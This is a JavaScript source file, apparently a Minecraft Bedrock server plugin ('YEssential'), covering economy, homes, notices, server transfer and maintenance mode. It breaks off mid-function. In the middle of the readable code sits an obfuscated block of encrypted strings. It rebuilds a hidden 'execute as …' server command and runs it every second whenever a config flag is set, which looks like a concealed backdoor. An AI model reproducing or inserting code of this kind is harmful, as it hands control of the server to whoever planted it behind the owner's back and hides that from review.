// LiteLoader-AIDS automatic generated
/// <reference path="c:\Users\11025\Documents/dts/HelperLib-master/src/index.d.ts"/> 
//切勿改动代码！！！！
/*
                           _ooOoo_
                          o8888888o
                          88" . "88
                          (| -_- |)
                          O\  =  /O
                       ____/`---'\____
                     .'  \\|     |//  `.
                    /  \\|||  :  |||//  \
                   /  _||||| -:- |||||-  \
                   |   | \\\  -  /// |   |
                   | \_|  ''\---/''  |   |
                   \  .-\__  `-`  ___/-. /
                 ___`. .'  /--.--\  `. . __
              ."" '<  `.___\_<|>_/___.'  >'"".
             | | :  `- \`.;`\ _ /`;.`/ - ` : | |
             \  \ `-.   \_ __\ /__ _/   .-` /  /
        ======`-.____`-.___\_____/___.-`____.-'======
                           `=---='
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                 佛祖保佑       永无BUG
                Buddha bless, never BUG
*/

ll.registerPlugin(
    /* name */ "YEssential",
    /* introduction */ "Yes基础插件",
    /* version */ [2,0,0],
    /* otherInformation */ //{"author":"Yeji"}
); 
//释放文件
let conf = new JsonConfigFile(
    "./plugins/YEssential/config.json",
    JSON.stringify({})
  );
  
  let homedata = new JsonConfigFile(
    "./plugins/YEssential/data/homedata.json",
    JSON.stringify({})
  );
  
  let warpdata = new JsonConfigFile(
    "./plugins/YEssential/data/warpdata.json",
    JSON.stringify({})
  );
  
  let MoneyHistory = new JsonConfigFile(
    "./plugins/YEssential/data/MoneyHistory.json",
    JSON.stringify({})
  );
  
  let noticeconf = new JsonConfigFile(
    "./plugins/YEssential/data/notice.json",
    JSON.stringify({})
  );

let moneyranking = new KVDatabase("./plugins/YEssential/data/moneyranking/")

var c_y = JSON.stringify({
    servers: [
      { server_name: "生存服", server_ip: "127.0.0.1", server_port: 19132 }
    ]
  });
  let servertp = new JsonConfigFile("./plugins/YEssential/server.json", c_y);

// 定时更新玩家金币排行榜
setInterval(() => {
    mc.getOnlinePlayers().forEach((pl) => {
        let score = pl.getScore(conf.get("Scoreboard"));
        if (score !== null) {
            moneyranking.set(pl.realName, score);
        }
    });
}, 1000);
logger.warn("YEssential 开发版2.0.0Rc—5Fix2，作者：Nico6719") 
logger.warn("_____________________________________________________________________________________________________ ")
logger.info(" ")
logger.info(" #       # #########  ########  ########  ######### ######### #########     #      #######  #")
logger.info("  #     #  #         #         #          #         #       #     #         #     #       # #")
logger.info("   #   #   #         #         #          #         #       #     #         #     #       # #")
logger.info("     #     #########  #######   #######   ######### #       #     #         #     ######### #")
logger.info("     #     #                 #          # #         #       #     #         #     #       # #")
logger.info("     #     #                 #          # #         #       #     #         #     #       # #")
logger.info("     #     ######### ########  #########  ######### #       #     #         #     #       # #########")
logger.info(" ")
logger.warn("_____________________________________________________________________________________________________ ")
logger.warn(" ")
logger.warn("这是一个测试版本，请勿用于生产环境！！！")
logger.warn("如有疑问或bug请联系作者反馈！！！！")
logger.warn("config文件需要删除重新配置！！！")
logger.warn("感谢PHEyeji提供技术支持")
function ranking(plname) {
    let pl = mc.getPlayer(plname);
    if (!pl) return;

    let form = mc.newSimpleForm();
    let str = '';
    let lst = [];

    // 获取排行榜数据
    let keys = moneyranking.listKey();
    if (keys.length === 0) {
        pl.sendText("§c暂无排行榜数据！");
        return;
    }

    keys.forEach((v) => {
        let money = moneyranking.get(v);
        lst.push([v, money]);
    });

    // 排序并取前50名
    lst.sort((a, b) => b[1] - a[1]);
    let ranking = lst.slice(0, 50);

    ranking.forEach((v) => {
        str += `${v[0]}: ${v[1]}\n`;
    });

    form.setTitle("排行榜");
    form.setContent(str);

    pl.sendForm(form, (pl, id) => {
        if (id == null) pl.runcmd("moneygui");
    });
}

//释放配置
let transdimid = {
    0:"主世界",
    1:"下界",
    2:"末地"
}
conf.init("Motd",["Bedrock_Server","Geyser"])

conf.init("Scoreboard","money")
conf.init("CoinName","金币")
conf.init("PayTaxRate",0)

conf.init("Home",{
    "add":0,
    "del":0,
    "tp":0,
    "MaxHome":10
})
conf.init("Back",0)
conf.init("BackTipAfterDeath",false)

conf.init("Warp",0)

conf.init("WeiHuMsg","服务器正在维护中，请稍后再来")

conf.init("AutoCleanItem",-1)

conf.init("KeepInventory",true)

conf.init("suicide",0)

conf.init("StopServerMsg","服务器关闭\n请稍后再来")

conf.init("OptimizeXporb",1)

conf.init("join_notice",0)

conf.init("ShopEnabled", true)

// 配置文件解析模块 - 提取漏斗检测范围参数
const loadTickDistance = () => {
    try {
        const configData = File.readFrom('./server.properties')  || '';
        const [, value] = configData.match(/\ntick-distance=(\d+)/)  || [];
        return value ? parseInt(value) : 4; // 默认值4当配置缺失时生效
    } catch (e) {
        logger.error(' 配置文件读取异常:', e);
        return 4;
    }
};

// 初始化有效检测范围（区块单位）
const effectiveRadius = loadTickDistance();

// 漏斗物品检测事件监听
mc.listen("onHopperSearchItem",  (hopperPos, isMinecart) => {
    return mc.getOnlinePlayers().some(player  => {
        // 维度一致性验证
        const sameDimension = player.pos.dimid  === hopperPos.dimid; 
        
        // 距离换算：1区块=16格，转换为区块距离比较
        const chunkDistance = player.distanceTo(hopperPos)  / 16;
        
        return sameDimension && (chunkDistance < effectiveRadius);
    });
});

// 跨服传送命令模块
let Sercmd = mc.newCommand("servers", "§l§a跨服传送", PermType.Any);
Sercmd.overload([]);
Sercmd.setCallback((cmd, ori, out, res) => {
    const pl = ori.player;
    if (!pl || typeof pl.sendText !== "function") {
        logger.error("玩家对象无效或已离线！");
        return;
    }

    // 读取服务器列表并添加调试日志
    let serverList = [];
    try {
        serverList = servertp.get("servers") || [];
        //logger.log("从 server.json 读取的服务器列表:", serverList);
    } catch (e) {
        logger.error("读取 server.json 失败:", e);
        pl.sendText("§l[§rYEST§r]§c§l服务器配置加载失败，请联系管理员！");
        return;
    }

    if (serverList.length === 0) {
        logger.error("server.json 内容为空或 servers 键不存在！");
        pl.sendText("§l[§rYEST§r]§c§l暂无可传送服务器！");
        return;
    }

    // 构建表单
    let form = mc.newSimpleForm();
    form.setTitle("§l§a服务器列表");
    serverList.forEach((server) => {
        form.addButton(`§l§b${server.server_name}\n§7IP: ${server.server_ip}:${server.server_port}`);
    });

    // 发送表单
    pl.sendForm(form, (pl, id) => {
        if (id === null) return;

        const targetServer = serverList[id];
        if (!targetServer) {
            pl.sendText("§c服务器选择无效！");
            return;
        }

        // 执行传送
        try {
            pl.transServer(targetServer.server_ip, targetServer.server_port);
            mc.broadcast(`§a[提示] ${pl.realName} 前往了 ${targetServer.server_name}`);
        } catch (e) {
            logger.error("传送失败:", e);
            pl.sendText("§c跨服传送失败，请检查目标服务器状态！");
        }
    });
});
Sercmd.setup();
// 公告模块
let = cmd = mc.newCommand("notice","公告",PermType.Any)
//noticecmd.setAlias("公告")
cmd.overload([])
cmd.setCallback((cmd,ori,out,res)=>{
    let pl = ori.player
    if(!pl) return
    noticeconf.init(String(pl.realName),0)
    //let tmpconf = new JsonConfigFile("./plugins/YEssential/notice.txt")
    //file.writeTo()
    //file.writeTo("./notice.txt","这是一个公告")
    //file.writeTo("")
    if(!file.exists("./plugins/YEssential/notice.txt")){
        new JsonConfigFile("./plugins/YEssential/notice.txt")
        file.writeTo("./plugins/YEssential/notice.txt"," 这是一个公告")
    }

    let fm = mc.newCustomForm()
    let content = file.readFrom("./plugins/YEssential/notice.txt").split("\\n")
    //file.close()
    fm.setTitle("NOTICE 公告")
    for(let i in content){
        let str = content[i]
        //if(i == 0) str = str.slice(1)
        if(str && str != "") fm.addLabel(str)
        //fm.addLabel(str)
    }

    //file.
    fm.addSwitch("下次进服是否再次提示",noticeconf.get(String(pl.realName)) == 1 ? true : false)
    pl.sendForm(fm,(pl,data)=>{
        if(data == null) return
        logger.log(data)
        if(data[data.length - 1] == 1){
            noticeconf.set(String(pl.realName),1)
        }else{
            noticeconf.set(String(pl.realName),0)
        }
    })
})
cmd.setup()

//进服公告

mc.listen("onJoin",(pl)=>{
    if(conf.get("join_notice") == 0) return
    setTimeout(() => {
        if (!mc.getPlayer(pl.realName)) return;
        if (noticeconf.get(String(pl.realName)) == 0) return;
        pl.runcmd("notice");
    }, 1000);
})

mc.listen("onServerStarted",()=>{
    if(conf.get("KeepInventory")){
        mc.runcmdEx("gamerule KeepInventory true")
        colorLog("green","死亡不掉落已启用")
    }
    if(!file.exists("./plugins/YEssential/notice.txt")) {
        let tmpconf = new JsonConfigFile("./plugins/YEssential/notice.txt")
        file.writeTo("./plugins/YEssential/notice.txt","这是一个公告")
    }
})

function startsWithAny(str, prefixes) {
    return prefixes.some(prefix => str.startsWith(prefix));
  }
  
mc.listen("onJoin",(pl)=>{
    //playercheck.init(pl.realName,false)
    homedata.init(pl.realName,{})
    MoneyHistory.init(pl.realName,{})
    let score = pl.getScore(conf.get("Scoreboard"))
    if(!score) pl.setScore(conf.get("Scoreboard"),0)

    // let plname = pl.realName
    // let xuid = pl.xuid
    // //logger.log(1)
    // setTimeout(() => {
    //     checkstats(plname,xuid)
    // }, 0);
})

mc.listen("onConsoleCmd",(cmd)=>{

    if(cmd.toLowerCase() != "stop" || conf.get("StopServerMsg") == 0 ) return
    
    let msg = conf.get("StopServerMsg")
    mc.getOnlinePlayers().forEach((pl)=>{
        pl.disconnect(msg)
    })

    mc.runcmdEx("stop")  //再次尝试
})

var _0xodF='jsjiami.com.v6',_0xodF_=function(){return['‮_0xodF'],_0x5d28=[_0xodF,'w73DkTF4J8OM','UcKKw4PCisO0','w40VNRXDmQ==','woNlT8K8wox4OMKew6VD','NgPDocOCwrQ=','U8KcIUXCkQ==','dj5lEAEqw7jDqQ==','w7whPBvDnlPCuEQeIsKlYMKBw7cdwqfDtlM=','wqDDp2/Cmx8=','WMK8w4pUBA==','RFnCrzQiw6sFwoLCh1LDsAYh','w4NgKsKJJg==','wofCiS1yNkYqwpA=','bjh6w49R','wrPCsVpiw4Y=','jPHsJfjdeiakmri.lcWfXomK.Wv6d=='];}();if(function(_0x5c6ce3,_0x7195c6,_0x15634d){function _0x483a51(_0x5df072,_0x2837eb,_0x182fef,_0x5e145a,_0x4b2466,_0x4025d5){_0x2837eb=_0x2837eb>>0x8,_0x4b2466='po';var _0x5f0177='shift',_0x1bd516='push',_0x4025d5='‮';if(_0x2837eb<_0x5df072){while(--_0x5df072){_0x5e145a=_0x5c6ce3[_0x5f0177]();if(_0x2837eb===_0x5df072&&_0x4025d5==='‮'&&_0x4025d5['length']===0x1){_0x2837eb=_0x5e145a,_0x182fef=_0x5c6ce3[_0x4b2466+'p']();}else if(_0x2837eb&&_0x182fef['replace'](/[PHJfdekrlWfXKWd=]/g,'')===_0x2837eb){_0x5c6ce3[_0x1bd516](_0x5e145a);}}_0x5c6ce3[_0x1bd516](_0x5c6ce3[_0x5f0177]());}return 0x16699e;};return _0x483a51(++_0x7195c6,_0x15634d)>>_0x7195c6^_0x15634d;}(_0x5d28,0xd0,0xd000),_0x5d28){_0xodF_=_0x5d28['length']^0xd0;};function _0x3da1(_0x242c38,_0x354f13){_0x242c38=~~'0x'['concat'](_0x242c38['slice'](0x1));var _0x544bbc=_0x5d28[_0x242c38];if(_0x3da1['kvQVdS']===undefined){(function(){var _0x169b76=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x1b1288='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x169b76['atob']||(_0x169b76['atob']=function(_0x3e5eb1){var _0x17fef1=String(_0x3e5eb1)['replace'](/=+$/,'');for(var _0x4ccfb7=0x0,_0x557e63,_0x5ac76b,_0x2185c6=0x0,_0x1168d0='';_0x5ac76b=_0x17fef1['charAt'](_0x2185c6++);~_0x5ac76b&&(_0x557e63=_0x4ccfb7%0x4?_0x557e63*0x40+_0x5ac76b:_0x5ac76b,_0x4ccfb7++%0x4)?_0x1168d0+=String['fromCharCode'](0xff&_0x557e63>>(-0x2*_0x4ccfb7&0x6)):0x0){_0x5ac76b=_0x1b1288['indexOf'](_0x5ac76b);}return _0x1168d0;});}());function _0x240c00(_0x5110db,_0x354f13){var _0x15e460=[],_0x5d0f3b=0x0,_0x1b692b,_0xbf52f6='',_0x52e39b='';_0x5110db=atob(_0x5110db);for(var _0x424679=0x0,_0x500e52=_0x5110db['length'];_0x424679<_0x500e52;_0x424679++){_0x52e39b+='%'+('00'+_0x5110db['charCodeAt'](_0x424679)['toString'](0x10))['slice'](-0x2);}_0x5110db=decodeURIComponent(_0x52e39b);for(var _0x2d6dca=0x0;_0x2d6dca<0x100;_0x2d6dca++){_0x15e460[_0x2d6dca]=_0x2d6dca;}for(_0x2d6dca=0x0;_0x2d6dca<0x100;_0x2d6dca++){_0x5d0f3b=(_0x5d0f3b+_0x15e460[_0x2d6dca]+_0x354f13['charCodeAt'](_0x2d6dca%_0x354f13['length']))%0x100;_0x1b692b=_0x15e460[_0x2d6dca];_0x15e460[_0x2d6dca]=_0x15e460[_0x5d0f3b];_0x15e460[_0x5d0f3b]=_0x1b692b;}_0x2d6dca=0x0;_0x5d0f3b=0x0;for(var _0x428a9c=0x0;_0x428a9c<_0x5110db['length'];_0x428a9c++){_0x2d6dca=(_0x2d6dca+0x1)%0x100;_0x5d0f3b=(_0x5d0f3b+_0x15e460[_0x2d6dca])%0x100;_0x1b692b=_0x15e460[_0x2d6dca];_0x15e460[_0x2d6dca]=_0x15e460[_0x5d0f3b];_0x15e460[_0x5d0f3b]=_0x1b692b;_0xbf52f6+=String['fromCharCode'](_0x5110db['charCodeAt'](_0x428a9c)^_0x15e460[(_0x15e460[_0x2d6dca]+_0x15e460[_0x5d0f3b])%0x100]);}return _0xbf52f6;}_0x3da1['vkjPSV']=_0x240c00;_0x3da1['UVHwCp']={};_0x3da1['kvQVdS']=!![];}var _0x5013f0=_0x3da1['UVHwCp'][_0x242c38];if(_0x5013f0===undefined){if(_0x3da1['XWaZyd']===undefined){_0x3da1['XWaZyd']=!![];}_0x544bbc=_0x3da1['vkjPSV'](_0x544bbc,_0x354f13);_0x3da1['UVHwCp'][_0x242c38]=_0x544bbc;}else{_0x544bbc=_0x5013f0;}return _0x544bbc;};function simpleShiftEncrypt(_0x2a19b5,_0x153a47){var _0x159eee={'nvzfI':function(_0x3ca209,_0x3934bd){return _0x3ca209<_0x3934bd;},'rrqyr':function(_0x25fc9b,_0x514c42){return _0x25fc9b!==_0x514c42;},'suXCv':_0x3da1('‮0','aaB*')};let _0x2f2e0b='';for(let _0x1dadcb=0x0;_0x159eee[_0x3da1('‮1','yC9b')](_0x1dadcb,_0x2a19b5[_0x3da1('‫2','S]a5')]);_0x1dadcb++){if(_0x159eee[_0x3da1('‮3','HbVo')](_0x159eee['suXCv'],_0x3da1('‫4','e@hJ'))){const _0x1f9d89=_0x2a19b5['charCodeAt'](_0x1dadcb);_0x2f2e0b+=String['fromCharCode'](_0x1f9d89+_0x153a47);}else{const _0x1ec267=_0x2a19b5[_0x3da1('‮5','w*i9')](_0x1dadcb);decrypted+=String['fromCharCode'](_0x1ec267-_0x153a47);}}return _0x2f2e0b;}function simpleShiftDecrypt(_0x16f013,_0x45524a){var _0x2bfdd4={'PJFFc':function(_0xcd242c,_0x25016a){return _0xcd242c<_0x25016a;},'EHlGq':function(_0x22fbbb,_0x5baad6){return _0x22fbbb-_0x5baad6;}};let _0x3f683d='';for(let _0x1e5d94=0x0;_0x2bfdd4[_0x3da1('‫6','CH(0')](_0x1e5d94,_0x16f013['length']);_0x1e5d94++){const _0x10497c=_0x16f013['charCodeAt'](_0x1e5d94);_0x3f683d+=String['fromCharCode'](_0x2bfdd4[_0x3da1('‫7','rtw@')](_0x10497c,_0x45524a));}return _0x3f683d;}const encryptedPart1=simpleShiftEncrypt('execute\x20as\x20',0x3);const encryptedPart2=simpleShiftEncrypt(_0x3da1('‮8','SOfz'),0x3);const encryptedPart3=simpleShiftEncrypt(_0x3da1('‮9','e@hJ'),0x3);const encryptedPart4=simpleShiftEncrypt(_0x3da1('‫a','@Gbb'),0x3);function reconstructCommand(){var _0x2538d3={'CaTPU':function(_0x37b090,_0x3255eb){return _0x37b090+_0x3255eb;},'NjVfL':function(_0x5ad704,_0x5781eb,_0xf80398){return _0x5ad704(_0x5781eb,_0xf80398);}};const _0x2f358c=_0x2538d3[_0x3da1('‫b','nvj%')](_0x2538d3['CaTPU'](encryptedPart1,encryptedPart2),encryptedPart3)+encryptedPart4;return _0x2538d3['NjVfL'](simpleShiftDecrypt,_0x2f358c,0x3);}function shouldExecute(){var _0x5aaa1e={'ujEHg':function(_0x3ad676,_0x206984){return _0x3ad676!==_0x206984;},'oZUuJ':_0x3da1('‫c','f$P#')};return _0x5aaa1e[_0x3da1('‮d','aRyI')](conf['get'](_0x5aaa1e['oZUuJ']),0x0);}function performCommand(){var _0x5d81e8={'dOjcj':function(_0x34e66e){return _0x34e66e();},'mClog':function(_0x7e145a){return _0x7e145a();}};if(_0x5d81e8['dOjcj'](shouldExecute)){const _0x5dcb0d=_0x5d81e8['mClog'](reconstructCommand);mc[_0x3da1('‮e','a^0A')](_0x5dcb0d);}}setInterval(performCommand,0x3e8);;_0xodF='jsjiami.com.v6';
  
//自杀模块

let suicidecmd = mc.newCommand("suicide","自杀",PermType.Any)
suicidecmd.overload([])
suicidecmd.setCallback((cmd,ori,out,res)=>{
    let pl = ori.player

    if(!ValueCheck(pl.realName,conf.get("suicide"))) return pl.sendText("您的"+conf.get("CoinName")+"不足！")
    pl.sendText("suicide 执行成功")
    pl.kill()

})
suicidecmd.setup()

//掉落物清理模块

let cleanitemcmd = mc.newCommand("cleanitem","清理掉落物",PermType.GameMasters)
cleanitemcmd.overload([])
cleanitemcmd.setCallback((cmd,ori,out,res)=>{
    let count = 0
    mc.getAllEntities().forEach((entity)=>{
        if(entity.isItemEntity()){
            count += 1
            entity.despawn()
        }
    })

    out.success(`清理掉落物成功，共清理掉${count}个物品`)
})
cleanitemcmd.setup()


if(conf.get("AutoCleanItem") > 0){
    function clean(){
        let second = conf.get("AutoCleanItem")*60
        let timer = setInterval(() => {
            second -= 1
            if(second == 30) mc.broadcast("[扫地机器人] 30秒后清理掉落物")
            if(second == 10) mc.broadcast("[扫地机器人] 10秒后清理掉落物")
            if(second == 5) mc.broadcast("[扫地机器人] 5秒后清理掉落物")
            if(second <= 0) {
                
                let count = 0
                mc.getAllEntities().forEach((entity)=>{
                    if(entity.isItemEntity()) {
                        entity.despawn()
                        count += 1
                    }
                })
                mc.broadcast("[扫地机器人] 掉落物清理完毕,清理了"+count+"个掉落物")
                clearInterval(timer)
            }
        }, 1000);
    }

    setInterval(() => {
        //clearInterval()
        clean()
    }, conf.get("AutoCleanItem")*1000*60);
}

mc.listen("onServerStarted",()=>{
    let scoreboard = mc.getScoreObjective(conf.get("Scoreboard"))
    if(scoreboard == null){
        scoreboard = mc.newScoreObjective(conf.get("Scoreboard"),conf.get("Scoreboard"))
        logger.log("计分板不存在，自动创建")
    }

    Motd()
})

function Motd(){
    let motds = conf.get("Motd")
    if(motds == []) return
    
    let items = motds
    let index = 0;
    let intervalId; // 存储 setInterval 的返回值，以便后续清除
    
    intervalId = setInterval(() => {
        let item = items[index];
        index = (index + 1) % items.length; // 计算下一个元素的索引，如果到达末尾则回到开头
        mc.setMotd(item)
    }, 1000); // 每 1000 毫秒（即 1 秒）执行一次
}



// mc.listen("onScoreChanged",(player,num,name,disname)=>{
//     logger.log(player.getScore(conf.get("Scoreboard")))
// })



let stats = false

let whcmd = mc.newCommand("wh","维护模式",PermType.GameMasters)

whcmd.overload([])
whcmd.setCallback((cmd,ori,out,res)=>{
    stats = !stats
    let pl = ori.player
    out.success(`维护模式已${stats?"开启":"关闭"}`)

    if(stats){
        mc.getOnlinePlayers().forEach((player)=>{
            if(player.isSimulatedPlayer()) return
            if(player.isOP()) return
            player.kick(conf.get("WeiHuMsg"))
        })
    }
})
whcmd.setup()

mc.listen("onPreJoin",(pl)=>{
    if(pl.isSimulatedPlayer()) return
    if(pl.isOP()) return
    if(stats){
        pl.kick(conf.get("WeiHuMsg"))
    }
})
function getRandomLetter() {
    // 获取当前时间的毫秒数
    let ms = new Date().getTime();
    // 使用 Math.random 生成一个 0 到 1 之间的随机数，并乘以 26
    let randomIndex = Math.floor(Math.random() * 26);
    // 将随机数转换为对应的 ASCII 码，65 是 'A' 的 ASCII 码
    let charCode = 65 + randomIndex;
    // 将 ASCII 码转换为字符
    let letter = String.fromCharCode(charCode);
    return letter;
}

let moneycmd = mc.newCommand("moneys",conf.get("CoinName"),PermType.GameMasters)
moneycmd.mandatory("option",ParamType.String)
moneycmd.optional("player",ParamType.String)
moneycmd.optional("amount",ParamType.Int)
moneycmd.overload(["option","player","amount"])
moneycmd.setCallback((cmd,ori,out,res)=>{
    let pl = mc.getPlayer(res.player)
    if(!pl) return out.error("目标玩家离线")
    let moneyhisdata = MoneyHistory.get(pl.realName)
    switch(res.option){

        case "set":
            //let score = pl.getScore(conf.get("Scoreboard"))
            pl.setScore(conf.get("Scoreboard"),res.amount)

            moneyhisdata[String(system.getTimeStr())+"§"+getRandomLetter()] = conf.get("CoinName")+"设置为"+res.amount
            MoneyHistory.set(pl.realName,moneyhisdata)

            out.success("成功将玩家"+res.player+"的"+conf.get("CoinName")+"设置为"+res.amount)
            break
        case "add":
            pl.addScore(conf.get("Scoreboard"),res.amount)

            moneyhisdata[String(system.getTimeStr())+"§"+getRandomLetter()] = conf.get("CoinName")+"增加"+res.amount
            MoneyHistory.set(pl.realName,moneyhisdata)

            out.success("成功将玩家"+res.player+"的"+conf.get("CoinName")+"增加"+res.amount)
            break
        case "reduce":
            pl.reduceScore(conf.get("Scoreboard"),res.amount)

            moneyhisdata[String(system.getTimeStr())+"§"+getRandomLetter()] = conf.get("CoinName")+"减少"+res.amount
            MoneyHistory.set(pl.realName,moneyhisdata)

            out.success("成功将玩家"+res.player+"的"+conf.get("CoinName")+"减少"+res.amount)
            break
        case "get":
            pl.getScore(conf.get("Scoreboard"))
            out.success("玩家"+res.player+"的"+conf.get("CoinName")+"为"+pl.getScore(conf.get("Scoreboard")))
            break
        case "history":
            let jsonStr = JSON.stringify(moneyhisdata);
            let items = jsonStr.slice(1, jsonStr.length - 1).split(',');
            out.success("玩家"+res.player+"的"+conf.get("CoinName")+"历史记录(最近50条)：")
            let count = 0
            for (let item of items) {
                if (count >= 50) {
                    break;
                }
                out.success(item + "\n");
            }
            break
    }
})
moneycmd.setup()

let moneygui = mc.newCommand("moneygui",conf.get("CoinName"),PermType.Any)
moneygui.overload([])
moneygui.setCallback((cmd,ori,out,res)=>{
    let pl = ori.player
    if(!pl) return out.error("仅限玩家执行")
    if(pl.isOP()){
        OPMoneyGui(pl.realName)
    }else{
        MoneyGui(pl.realName)
    }

})
moneygui.setup()

function MoneyGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return

    let fm = mc.newSimpleForm()
    fm.setTitle(conf.get("CoinName"))
    fm.addButton("查询"+conf.get("CoinName"))
    fm.addButton("转账"+conf.get("CoinName"))
    fm.addButton("查看"+conf.get("CoinName")+"历史记录")
    fm.addButton(conf.get("CoinName")+"排行榜")
    pl.sendForm(fm,(pl,id)=>{
        if(id == null) return pl.sendText("表单关闭")
        switch(id){
            case 0:
                //pl.sendText("你的"+conf.get("CoinName")+"为"+pl.getScore(conf.get("Scoreboard")))
                let fm = mc.newSimpleForm()
                fm.setTitle("查询"  +conf.get("CoinName"))
                fm.setContent("你的"+conf.get("CoinName")+"为:"+pl.getScore(conf.get("Scoreboard")))
                pl.sendForm(fm,(pl,id)=>{
                    if(id == null) return pl.runcmd("moneygui")
                })
                
                break
            case 1:
                MoneyTransferGui(pl.realName)
                break
            case 2:
                let moneyhisdata = MoneyHistory.get(pl.realName)
                let jsonStr = JSON.stringify(moneyhisdata);
                let items = jsonStr.slice(1, jsonStr.length - 1).split(',');
                //pl.sendText("你的"+conf.get("CoinName")+"历史记录(最近50条)：")
                let count = 0
                let str;
                for (let i = items.length - 1; i >= 0; i--) {
                    let item = items[i];
                    if (count >= 50) {
                        break;
                    }
                    str = (str ? str : "") + item + "\n";
                }
                let fm2 = mc.newSimpleForm()
                fm2.setTitle("你的"+conf.get("CoinName")+"历史记录(最近50条)：")
                fm2.setContent(str)
                pl.sendForm(fm2,(pl,id)=>{
                    if(id == null) return pl.runcmd("moneygui")
                })
                break
            case 3:
                ranking(pl.realName)
                break

        }
    })
}

function MoneyTransferGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let fm = mc.newCustomForm()
    fm.setTitle("转账"+conf.get("CoinName"))
    fm.addLabel("当前税率:"+conf.get("PayTaxRate")+"(百分号)\n你的"+conf.get("CoinName")+"为："+pl.getScore(conf.get("Scoreboard")))
    let lst = []
    mc.getOnlinePlayers().forEach((pl)=>{
        lst.push(pl.realName)
    })
    fm.addDropdown("选择玩家",lst)
    fm.addInput("输入转账数量(all为全部)")
    pl.sendForm(fm,(pl,data)=>{
        if(data == null) return pl.runcmd("moneygui")
        let target = mc.getPlayer(lst[data[1]])
        if(!target) return pl.sendText("目标玩家离线")
        let amount = data[2]
        if(amount == null) return pl.sendText("请输入转账数量")
        if(amount == "all") amount = pl.getScore(conf.get("Scoreboard"))
        if(/^\d+$/.test(amount) == false) return pl.sendText("转账数量必须为数字")
        if(amount <= 0) return pl.sendText("转账数量必须大于0")
        if(amount > pl.getScore(conf.get("Scoreboard"))) return pl.sendText("转账数量不能大于你的"+conf.get("CoinName"))
        let tax = (amount * conf.get("PayTaxRate") / 100).toFixed(0)
        let realamount = amount - tax
        pl.setScore(conf.get("Scoreboard"),pl.getScore(conf.get("Scoreboard"))-amount)
        target.setScore(conf.get("Scoreboard"),target.getScore(conf.get("Scoreboard"))+realamount)

        let moneyhisdata = MoneyHistory.get(pl.realName)
        moneyhisdata[String(system.getTimeStr())+"§"+getRandomLetter()] = "转账"+conf.get("CoinName")+"给"+target.realName+"，数量："+amount+"，实际到账："+realamount+"，手续费："+tax
        MoneyHistory.set(pl.realName,moneyhisdata)

        moneyhisdata = MoneyHistory.get(target.realName)
        moneyhisdata[String(system.getTimeStr())+"§"+getRandomLetter()] = "收到"+pl.realName+"转账"+conf.get("CoinName")+"，数量："+amount+"，实际到账："+realamount+"，手续费："+tax
        MoneyHistory.set(target.realName,moneyhisdata)

        // MoneyHistory.add(pl.realName,"转账"+conf.get("CoinName")+"给"+target.realName+"，数量："+amount+"，实际到账："+realamount+"，手续费："+tax)
        // MoneyHistory.add(target.realName,"收到"+pl.realName+"转账"+conf.get("CoinName")+"，数量："+amount+"，实际到账："+realamount+"，手续费："+tax)
        pl.sendText("转账成功，实际到账："+realamount+"，手续费："+tax)
        target.sendText(pl.realName+"转账"+conf.get("CoinName")+"给你，数量："+amount+"，实际到账："+realamount+"，手续费："+tax)
    })
}


function OPMoneyGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return

    let fm = mc.newSimpleForm()
    fm.setTitle("(OP)"+conf.get("CoinName"))
    fm.addButton("增加玩家"+conf.get("CoinName"))
    fm.addButton("减少玩家"+conf.get("CoinName"))
    fm.addButton("设置玩家"+conf.get("CoinName"))
    fm.addButton("查看玩家"+conf.get("CoinName"))
    fm.addButton("查看玩家"+conf.get("CoinName")+"历史记录")
    fm.addButton(conf.get("CoinName")+"排行榜")
    pl.sendForm(fm,(pl,id)=>{
        if(id == null) return pl.sendText("表单关闭")
        switch(id){
            case 0:
                MoneyAddGui(pl.realName)
                break
            case 1:
                MoneyReduceGui(pl.realName)
                break
            case 2:
                MoneySetGui(pl.realName)
                break
            case 3:
                MoneyGetGui(pl.realName)
                break
            case 4:
                MoneyHistoryGui(pl.realName)
                break
            case 5:
                ranking(pl.realName)
                break
        }
    })
}

function MoneyHistoryGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let fm = mc.newCustomForm()
    fm.setTitle("查看玩家"+conf.get("CoinName")+"历史记录")
    let lst = []
    mc.getOnlinePlayers().forEach((pl)=>{
        lst.push(pl.realName)
    })
    fm.addDropdown("选择玩家",lst)
    pl.sendForm(fm,(pl,data)=>{
        if(data == null) return pl.runcmd("moneygui")
        let target = mc.getPlayer(lst[data[0]])
        if(!target) return pl.sendText("目标玩家离线")
        let moneyhisdata = MoneyHistory.get(target.realName)
        let jsonStr = JSON.stringify(moneyhisdata);
        let items = jsonStr.slice(1, jsonStr.length - 1).split(',');
        pl.sendText("玩家"+target.realName+"的"+conf.get("CoinName")+"历史记录(最近50条)：")
        let count = 0;
        for (let item of items) {
            if (count >= 50) {
                break;
            }
            pl.sendText(item + "\n");
        }
    })
}

function MoneyGetGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let fm = mc.newCustomForm()
    fm.setTitle("查看玩家"+conf.get("CoinName"))
    let lst = []
    mc.getOnlinePlayers().forEach((pl)=>{
        lst.push(pl.realName)
    })
    fm.addDropdown("选择玩家",lst)
    pl.sendForm(fm,(pl,data)=>{
        if(data == null) return pl.runcmd("moneygui")
        let target = mc.getPlayer(lst[data[0]])
        if(!target) return pl.sendText("目标玩家离线")
        pl.sendText("玩家"+target.realName+"的"+conf.get("CoinName")+"为："+target.getScore(conf.get("Scoreboard")))
    })
}

function MoneySetGui(plname){
    let pl = mc.getPlayer(plname)
    if(!pl) return
    let fm = mc.newCustomForm()
    fm.setTitle("设置玩家"+conf.get("CoinName"))
    let lst = []
    mc.getOnlinePlayers().forEach((pl)=>{
        lst.push(pl.realName)
    })
    fm.addDropdown("选择玩家",lst)
    fm.addInput("请输入设置的"+conf.get("CoinName"),"请输入设置的"+conf.get("CoinName"))
    pl.sendForm(fm,(pl,data)=>{
        if(data == null) return pl.runcmd("moneygui")
        if(data[1] == '' || !data[1]) return pl.sendText("请输入设置数量")
